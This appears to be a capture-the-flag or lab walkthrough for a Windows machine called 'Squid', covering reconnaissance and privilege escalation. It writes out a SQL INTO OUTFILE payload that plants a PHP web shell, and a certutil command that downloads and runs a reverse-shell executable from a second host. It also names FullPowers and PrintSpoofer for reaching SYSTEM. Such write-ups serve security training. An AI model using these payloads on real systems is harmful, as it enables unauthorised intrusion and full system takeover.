# 🏴 Squid (Windows)

## 🧠 Initial Foothold

- Ran a full Nmap scan:
  ```bash
  sudo nmap -Pn -n 192.168.102.189 -sC -sV -p- --open -oN Squid
  ```

- Used `rpcclient`, `enum4linux`, and `smbclient` to enumerate services and shares.

- Identified **Squid Proxy 4.14** running, but no public exploits were available.

- Referred to [HackTricks Squid guide](https://book.hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html) for additional attack vectors.

- Used FoxyProxy to browse internal URLs and found **phpMyAdmin** accessible.

- Logged in as `root` with no password and leveraged MySQL command injection to upload a PHP web shell:
  ```sql
  SELECT "<?php echo shell_exec($_GET['cmd']); ?>" INTO OUTFILE 'c:/wamp/www/webshell.php'
  ```

- Uploaded a reverse shell executable using the web shell:
  ```
  http://192.168.102.189:8080/webshell.php?cmd=certutil -urlcache -f http://192.168.45.229:8080/shell.exe shell.exe
  http://192.168.102.189:8080/webshell.php?cmd=shell.exe
  ```

- Received a shell as a low-privileged service account.

---

## 🚀 Privilege Escalation

- Checked available privileges:
  - `SeChangeNotify`
  - `SeCreateGlobal`

- Downloaded and ran [FullPowers.exe](https://github.com/itm4n/FullPowers/releases) as LOCAL SERVICE to elevate token privileges.

- Regained `SeAssignPrimaryToken` and `SeImpersonate` privileges.

- Used **PrintSpoofer** to escalate to SYSTEM and gain full control.

---

🧼 **Post-Exploitation Note:**  
Clear any dropped files and restore permissions where applicable.

> ⚠️ This walkthrough is for educational purposes only.
